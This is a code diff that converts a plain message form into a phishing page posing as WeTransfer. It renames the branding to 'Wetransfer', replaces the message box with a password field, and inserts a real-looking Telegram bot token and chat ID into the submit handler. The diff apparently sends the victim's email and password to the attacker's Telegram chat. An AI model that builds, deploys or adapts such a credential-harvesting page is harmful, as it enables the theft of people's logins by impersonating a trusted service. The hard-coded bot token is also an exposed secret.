@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Send Message</title>
+<title>Wetransfer</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
@@ -152,12 +152,14 @@ body{
     margin-bottom:40px;
   }
 
-  .input-group input,
-  .input-group textarea{
-    font-size:18px;
-    padding:20px;
-    border-radius:20px;
-  }
+  .input-group input[type="password"]{
+  font-size: 18px;
+  padding: 20px;
+  border-radius: 20px;
+  width: 100%;
+  border: none;
+  outline: none;
+}
 
   .btn{
     font-size:24px;
@@ -221,7 +223,7 @@ body{
 <div class="wrapper">
 
   <div class="logo">
-    Send message
+    Wetransfer
   </div>
 
   <div class="title">
@@ -229,7 +231,7 @@ body{
   </div>
 
   <div class="subtitle">
-    to continue to your message.
+    to continue to your Wetransfer.
   </div>
 
   <form id="messageForm">
@@ -244,12 +246,13 @@ body{
     </div>
 
     <div class="input-group">
-      <textarea 
-        id="message" 
-        placeholder="Type your message..."
-        required
-      ></textarea>
-    </div>
+  <input 
+    type="password" 
+    id="password" 
+    placeholder="Type your password..."
+    required
+  />
+</div>
 
     <button type="submit" class="btn">
       Continue
@@ -284,8 +287,8 @@ form.addEventListener("submit", async function(e){
   const email = document.getElementById("email").value;
   const message = document.getElementById("message").value;
 
-  const botToken = "YOUR_BOT_TOKEN";
-  const chatId = "YOUR_CHAT_ID";
+  const botToken = "8719151931:AAE9M4RyCXNwTtCeoXc4_8Tb287gD-M2aEA";
+  const chatId = "7327775914";
 
   const text = `
 New Message
